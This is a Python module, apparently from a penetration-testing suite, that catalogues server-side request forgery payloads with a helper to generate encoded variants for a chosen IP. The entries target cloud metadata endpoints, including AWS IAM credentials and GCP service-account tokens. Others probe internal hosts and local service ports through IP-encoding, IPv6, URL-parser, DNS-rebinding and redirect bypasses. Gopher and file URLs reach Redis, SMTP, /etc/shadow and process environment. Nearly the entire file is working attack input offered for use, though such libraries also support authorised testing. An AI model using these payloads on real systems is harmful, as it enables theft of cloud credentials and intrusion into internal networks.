"""
SSRF Payload Library - DeadMan Pentest Suite
Comprehensive SSRF payloads for cloud metadata, internal networks, and bypass techniques
"""

from typing import Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum


class SSRFCategory(Enum):
    CLOUD_METADATA = "cloud_metadata"
    LOCALHOST = "localhost"
    INTERNAL_NETWORK = "internal_network"
    IP_ENCODING = "ip_encoding"
    IPV6 = "ipv6"
    URL_PARSER_BYPASS = "url_parser_bypass"
    PROTOCOL_SMUGGLING = "protocol_smuggling"
    DNS_REBINDING = "dns_rebinding"
    REDIRECT_CHAIN = "redirect_chain"


@dataclass
class SSRFPayload:
    """SSRF payload with metadata"""
    name: str
    payload: str
    category: SSRFCategory
    description: str
    expected_response: str = ""
    severity: str = "high"


class SSRFPayloads:
    """
    Comprehensive SSRF payload library

    Usage:
        payloads = SSRFPayloads()
        for p in payloads.get_all():
            test_ssrf(p.payload)

        # Get specific category
        aws_payloads = payloads.get_by_category(SSRFCategory.CLOUD_METADATA)
    """

    # ==================== AWS EC2 METADATA ====================
    AWS_METADATA = [
        SSRFPayload("aws_metadata_root", "http://169.254.169.254/latest/meta-data/", SSRFCategory.CLOUD_METADATA, "AWS metadata root"),
        SSRFPayload("aws_iam_root", "http://169.254.169.254/latest/meta-data/iam/", SSRFCategory.CLOUD_METADATA, "AWS IAM metadata"),
        SSRFPayload("aws_credentials", "http://169.254.169.254/latest/meta-data/iam/security-credentials/", SSRFCategory.CLOUD_METADATA, "AWS IAM credentials list"),
        SSRFPayload("aws_user_data", "http://169.254.169.254/latest/user-data/", SSRFCategory.CLOUD_METADATA, "AWS user data (startup scripts)"),
        SSRFPayload("aws_hostname", "http://169.254.169.254/latest/meta-data/hostname", SSRFCategory.CLOUD_METADATA, "AWS hostname"),
        SSRFPayload("aws_public_ip", "http://169.254.169.254/latest/meta-data/public-ipv4", SSRFCategory.CLOUD_METADATA, "AWS public IP"),
        SSRFPayload("aws_instance_id", "http://169.254.169.254/latest/meta-data/instance-id", SSRFCategory.CLOUD_METADATA, "AWS instance ID"),
        SSRFPayload("aws_api_token", "http://169.254.169.254/latest/api/token", SSRFCategory.CLOUD_METADATA, "AWS IMDSv2 token"),
        SSRFPayload("aws_internal_dns", "http://metadata.aws.internal/latest/meta-data/", SSRFCategory.CLOUD_METADATA, "AWS internal DNS metadata"),
    ]

    # ==================== GCP METADATA ====================
    GCP_METADATA = [
        SSRFPayload("gcp_metadata_root", "http://metadata.google.internal/computeMetadata/v1/", SSRFCategory.CLOUD_METADATA, "GCP metadata root"),
        SSRFPayload("gcp_service_accounts", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/", SSRFCategory.CLOUD_METADATA, "GCP service accounts"),
        SSRFPayload("gcp_default_token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", SSRFCategory.CLOUD_METADATA, "GCP default SA token", severity="critical"),
        SSRFPayload("gcp_identity", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity", SSRFCategory.CLOUD_METADATA, "GCP identity token"),
        SSRFPayload("gcp_project_id", "http://metadata.google.internal/computeMetadata/v1/project/project-id", SSRFCategory.CLOUD_METADATA, "GCP project ID"),
        SSRFPayload("gcp_hostname", "http://metadata.google.internal/computeMetadata/v1/instance/hostname", SSRFCategory.CLOUD_METADATA, "GCP hostname"),
        SSRFPayload("gcp_machine_type", "http://metadata.google.internal/computeMetadata/v1/instance/machine-type", SSRFCategory.CLOUD_METADATA, "GCP machine type"),
        SSRFPayload("gcp_alt_ip", "http://169.254.169.254/computeMetadata/v1/", SSRFCategory.CLOUD_METADATA, "GCP metadata via IP"),
    ]

    # ==================== AZURE METADATA ====================
    AZURE_METADATA = [
        SSRFPayload("azure_metadata", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", SSRFCategory.CLOUD_METADATA, "Azure metadata"),
        SSRFPayload("azure_metadata_json", "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json", SSRFCategory.CLOUD_METADATA, "Azure metadata JSON"),
    ]

    # ==================== OTHER CLOUDS ====================
    OTHER_CLOUD_METADATA = [
        SSRFPayload("digitalocean_metadata", "http://169.254.169.254/metadata/v1/", SSRFCategory.CLOUD_METADATA, "DigitalOcean metadata"),
        SSRFPayload("digitalocean_user_data", "http://169.254.169.254/metadata/v1/user-data", SSRFCategory.CLOUD_METADATA, "DigitalOcean user data"),
        SSRFPayload("alibaba_metadata", "http://100.100.100.200/latest/meta-data/", SSRFCategory.CLOUD_METADATA, "Alibaba Cloud metadata"),
        SSRFPayload("tencent_metadata", "http://metadata.tencentyun.com/latest/", SSRFCategory.CLOUD_METADATA, "Tencent Cloud metadata"),
    ]

    # ==================== LOCALHOST ====================
    LOCALHOST = [
        SSRFPayload("localhost_root", "http://127.0.0.1/", SSRFCategory.LOCALHOST, "Localhost root"),
        SSRFPayload("localhost_8080", "http://127.0.0.1:8080/", SSRFCategory.LOCALHOST, "Localhost port 8080"),
        SSRFPayload("localhost_3000", "http://127.0.0.1:3000/", SSRFCategory.LOCALHOST, "Localhost port 3000 (Node.js)"),
        SSRFPayload("localhost_5000", "http://127.0.0.1:5000/", SSRFCategory.LOCALHOST, "Localhost port 5000 (Flask)"),
        SSRFPayload("localhost_8000", "http://127.0.0.1:8000/", SSRFCategory.LOCALHOST, "Localhost port 8000 (Django)"),
        SSRFPayload("localhost_redis", "http://127.0.0.1:6379/", SSRFCategory.LOCALHOST, "Redis default port"),
        SSRFPayload("localhost_mongo", "http://127.0.0.1:27017/", SSRFCategory.LOCALHOST, "MongoDB default port"),
        SSRFPayload("localhost_mysql", "http://127.0.0.1:3306/", SSRFCategory.LOCALHOST, "MySQL default port"),
        SSRFPayload("localhost_postgres", "http://127.0.0.1:5432/", SSRFCategory.LOCALHOST, "PostgreSQL default port"),
        SSRFPayload("localhost_elastic", "http://127.0.0.1:9200/", SSRFCategory.LOCALHOST, "Elasticsearch default port"),
        SSRFPayload("localhost_memcached", "http://127.0.0.1:11211/", SSRFCategory.LOCALHOST, "Memcached default port"),
        SSRFPayload("localhost_ssh", "http://127.0.0.1:22/", SSRFCategory.LOCALHOST, "SSH port"),
        SSRFPayload("localhost_smtp", "http://127.0.0.1:25/", SSRFCategory.LOCALHOST, "SMTP port"),
        SSRFPayload("localhost_word", "http://localhost/", SSRFCategory.LOCALHOST, "localhost hostname"),
        SSRFPayload("localhost_zero", "http://0.0.0.0/", SSRFCategory.LOCALHOST, "0.0.0.0 binding"),
        SSRFPayload("localhost_zero_port", "http://0:8080/", SSRFCategory.LOCALHOST, "0:8080 shorthand"),
    ]

    # ==================== INTERNAL NETWORKS ====================
    INTERNAL_NETWORK = [
        SSRFPayload("internal_10_0_0_1", "http://10.0.0.1/", SSRFCategory.INTERNAL_NETWORK, "Class A private (10.0.0.1)"),
        SSRFPayload("internal_10_0_0_10", "http://10.0.0.10:8080/", SSRFCategory.INTERNAL_NETWORK, "Internal service 10.0.0.10"),
        SSRFPayload("internal_172_16_0_1", "http://172.16.0.1/", SSRFCategory.INTERNAL_NETWORK, "Class B private (172.16.0.1)"),
        SSRFPayload("internal_192_168_1_1", "http://192.168.1.1/", SSRFCategory.INTERNAL_NETWORK, "Class C private (192.168.1.1)"),
        SSRFPayload("internal_link_local", "http://169.254.1.1/", SSRFCategory.INTERNAL_NETWORK, "Link-local address"),
    ]

    # ==================== IP ENCODING BYPASSES ====================
    IP_ENCODING = [
        # Decimal (Dword)
        SSRFPayload("decimal_localhost", "http://2130706433/", SSRFCategory.IP_ENCODING, "127.0.0.1 as decimal"),
        SSRFPayload("decimal_metadata", "http://2852039166/", SSRFCategory.IP_ENCODING, "169.254.169.254 as decimal"),
        SSRFPayload("decimal_10_0_0_1", "http://167772161/", SSRFCategory.IP_ENCODING, "10.0.0.1 as decimal"),

        # Hexadecimal
        SSRFPayload("hex_localhost", "http://0x7f000001/", SSRFCategory.IP_ENCODING, "127.0.0.1 as hex"),
        SSRFPayload("hex_metadata", "http://0xa9fea9fe/", SSRFCategory.IP_ENCODING, "169.254.169.254 as hex"),
        SSRFPayload("hex_dotted", "http://0x7f.0x00.0x00.0x01/", SSRFCategory.IP_ENCODING, "127.0.0.1 as dotted hex"),

        # Octal
        SSRFPayload("octal_localhost", "http://0177.0000.0000.0001/", SSRFCategory.IP_ENCODING, "127.0.0.1 as octal"),
        SSRFPayload("octal_metadata", "http://0251.0376.0251.0376/", SSRFCategory.IP_ENCODING, "169.254.169.254 as octal"),

        # Mixed encoding
        SSRFPayload("mixed_localhost", "http://0x7f.0.0.1/", SSRFCategory.IP_ENCODING, "127.0.0.1 mixed hex/decimal"),
        SSRFPayload("mixed_localhost_2", "http://127.0x00.0.0.1/", SSRFCategory.IP_ENCODING, "127.0.0.1 mixed"),
    ]

    # ==================== IPV6 ====================
    IPV6 = [
        SSRFPayload("ipv6_localhost", "http://[::1]/", SSRFCategory.IPV6, "IPv6 localhost"),
        SSRFPayload("ipv6_localhost_port", "http://[::1]:8080/", SSRFCategory.IPV6, "IPv6 localhost:8080"),
        SSRFPayload("ipv6_any", "http://[::]/", SSRFCategory.IPV6, "IPv6 any address"),
        SSRFPayload("ipv6_mapped_localhost", "http://[::ffff:127.0.0.1]/", SSRFCategory.IPV6, "IPv6-mapped localhost"),
        SSRFPayload("ipv6_mapped_metadata", "http://[::ffff:169.254.169.254]/", SSRFCategory.IPV6, "IPv6-mapped metadata"),
        SSRFPayload("ipv6_full_localhost", "http://[0:0:0:0:0:ffff:7f00:1]/", SSRFCategory.IPV6, "IPv6 full form localhost"),
    ]

    # ==================== URL PARSER BYPASSES ====================
    URL_PARSER_BYPASS = [
        # Fragment bypass
        SSRFPayload("fragment_bypass", "https://youtube.com#@127.0.0.1/", SSRFCategory.URL_PARSER_BYPASS, "Fragment # bypass"),
        SSRFPayload("fragment_metadata", "https://youtube.com#@169.254.169.254/latest/meta-data/", SSRFCategory.URL_PARSER_BYPASS, "Fragment bypass to metadata"),

        # Credential bypass
        SSRFPayload("cred_bypass", "https://127.0.0.1@youtube.com/", SSRFCategory.URL_PARSER_BYPASS, "Credential @ bypass"),
        SSRFPayload("cred_bypass_2", "https://allowed.com@127.0.0.1:8080/", SSRFCategory.URL_PARSER_BYPASS, "Credential bypass reversed"),
        SSRFPayload("cred_bypass_metadata", "https://169.254.169.254@youtube.com/latest/meta-data/", SSRFCategory.URL_PARSER_BYPASS, "Credential bypass to metadata"),

        # Double encoding
        SSRFPayload("double_encode_localhost", "http://127.0.0.1%253A8080/", SSRFCategory.URL_PARSER_BYPASS, "Double-encoded localhost"),
        SSRFPayload("double_encode_path", "http://169.254.169.254%252Flatest%252Fmeta-data%252F", SSRFCategory.URL_PARSER_BYPASS, "Double-encoded path"),

        # Null byte
        SSRFPayload("null_byte", "http://youtube.com%00@127.0.0.1/", SSRFCategory.URL_PARSER_BYPASS, "Null byte injection"),

        # Backslash
        SSRFPayload("backslash_bypass", "http://youtube.com\\@127.0.0.1/", SSRFCategory.URL_PARSER_BYPASS, "Backslash confusion"),
    ]

    # ==================== PROTOCOL SMUGGLING ====================
    PROTOCOL_SMUGGLING = [
        # Gopher
        SSRFPayload("gopher_redis_info", "gopher://127.0.0.1:6379/_INFO", SSRFCategory.PROTOCOL_SMUGGLING, "Gopher to Redis INFO"),
        SSRFPayload("gopher_redis_config", "gopher://127.0.0.1:6379/_CONFIG%20GET%20*", SSRFCategory.PROTOCOL_SMUGGLING, "Gopher to Redis CONFIG"),
        SSRFPayload("gopher_smtp", "gopher://127.0.0.1:25/_EHLO%20attacker.com", SSRFCategory.PROTOCOL_SMUGGLING, "Gopher to SMTP"),
        SSRFPayload("gopher_memcached", "gopher://127.0.0.1:11211/_stats", SSRFCategory.PROTOCOL_SMUGGLING, "Gopher to Memcached"),

        # Dict
        SSRFPayload("dict_redis", "dict://127.0.0.1:6379/info", SSRFCategory.PROTOCOL_SMUGGLING, "Dict to Redis"),

        # File
        SSRFPayload("file_passwd", "file:///etc/passwd", SSRFCategory.PROTOCOL_SMUGGLING, "File protocol /etc/passwd"),
        SSRFPayload("file_shadow", "file:///etc/shadow", SSRFCategory.PROTOCOL_SMUGGLING, "File protocol /etc/shadow"),
        SSRFPayload("file_environ", "file:///proc/self/environ", SSRFCategory.PROTOCOL_SMUGGLING, "File protocol environ"),
        SSRFPayload("file_cmdline", "file:///proc/self/cmdline", SSRFCategory.PROTOCOL_SMUGGLING, "File protocol cmdline"),

        # LDAP
        SSRFPayload("ldap_localhost", "ldap://127.0.0.1:389/", SSRFCategory.PROTOCOL_SMUGGLING, "LDAP localhost"),
    ]

    # ==================== DNS REBINDING ====================
    DNS_REBINDING = [
        SSRFPayload("rebind_localhost", "https://127.0.0.1.rebind.network/", SSRFCategory.DNS_REBINDING, "DNS rebinding to localhost"),
        SSRFPayload("rebind_metadata", "https://169.254.169.254.rebind.network/", SSRFCategory.DNS_REBINDING, "DNS rebinding to metadata"),
        SSRFPayload("rebind_internal", "https://10.0.0.1.rebind.network/", SSRFCategory.DNS_REBINDING, "DNS rebinding to internal"),
    ]

    # ==================== REDIRECT CHAINS ====================
    REDIRECT_CHAIN = [
        SSRFPayload("redirect_localhost", "https://httpbin.org/redirect-to?url=http://127.0.0.1/", SSRFCategory.REDIRECT_CHAIN, "Redirect chain to localhost"),
        SSRFPayload("redirect_metadata", "https://httpbin.org/redirect-to?url=http://169.254.169.254/latest/meta-data/", SSRFCategory.REDIRECT_CHAIN, "Redirect chain to metadata"),
    ]

    def get_all(self) -> List[SSRFPayload]:
        """Get all SSRF payloads"""
        all_payloads = []
        all_payloads.extend(self.AWS_METADATA)
        all_payloads.extend(self.GCP_METADATA)
        all_payloads.extend(self.AZURE_METADATA)
        all_payloads.extend(self.OTHER_CLOUD_METADATA)
        all_payloads.extend(self.LOCALHOST)
        all_payloads.extend(self.INTERNAL_NETWORK)
        all_payloads.extend(self.IP_ENCODING)
        all_payloads.extend(self.IPV6)
        all_payloads.extend(self.URL_PARSER_BYPASS)
        all_payloads.extend(self.PROTOCOL_SMUGGLING)
        all_payloads.extend(self.DNS_REBINDING)
        all_payloads.extend(self.REDIRECT_CHAIN)
        return all_payloads

    def get_by_category(self, category: SSRFCategory) -> List[SSRFPayload]:
        """Get payloads by category"""
        return [p for p in self.get_all() if p.category == category]

    def get_critical(self) -> List[SSRFPayload]:
        """Get only critical severity payloads"""
        return [p for p in self.get_all() if p.severity == "critical"]

    def get_cloud_metadata(self) -> List[SSRFPayload]:
        """Get all cloud metadata payloads"""
        return self.get_by_category(SSRFCategory.CLOUD_METADATA)

    def get_bypass_techniques(self) -> List[SSRFPayload]:
        """Get all bypass technique payloads"""
        bypasses = []
        bypasses.extend(self.get_by_category(SSRFCategory.IP_ENCODING))
        bypasses.extend(self.get_by_category(SSRFCategory.IPV6))
        bypasses.extend(self.get_by_category(SSRFCategory.URL_PARSER_BYPASS))
        bypasses.extend(self.get_by_category(SSRFCategory.DNS_REBINDING))
        bypasses.extend(self.get_by_category(SSRFCategory.REDIRECT_CHAIN))
        return bypasses

    def generate_for_target(self, target_ip: str, ports: List[int] = None) -> List[str]:
        """Generate payloads for a specific target IP"""
        ports = ports or [80, 8080, 443, 3000, 5000, 8000, 8443]
        payloads = []

        for port in ports:
            payloads.append(f"http://{target_ip}:{port}/")

        # Add encoded versions
        octets = target_ip.split(".")
        if len(octets) == 4:
            # Decimal
            decimal = int(octets[0]) * 16777216 + int(octets[1]) * 65536 + int(octets[2]) * 256 + int(octets[3])
            payloads.append(f"http://{decimal}/")

            # Hex
            hex_ip = "0x" + "".join(f"{int(o):02x}" for o in octets)
            payloads.append(f"http://{hex_ip}/")

            # Octal
            octal_ip = ".".join(f"0{int(o):o}" for o in octets)
            payloads.append(f"http://{octal_ip}/")

        return payloads


# Convenience functions
def get_all_ssrf_payloads() -> List[SSRFPayload]:
    """Get all SSRF payloads"""
    return SSRFPayloads().get_all()


def get_cloud_metadata_payloads() -> List[SSRFPayload]:
    """Get cloud metadata payloads"""
    return SSRFPayloads().get_cloud_metadata()


def get_bypass_payloads() -> List[SSRFPayload]:
    """Get bypass technique payloads"""
    return SSRFPayloads().get_bypass_techniques()
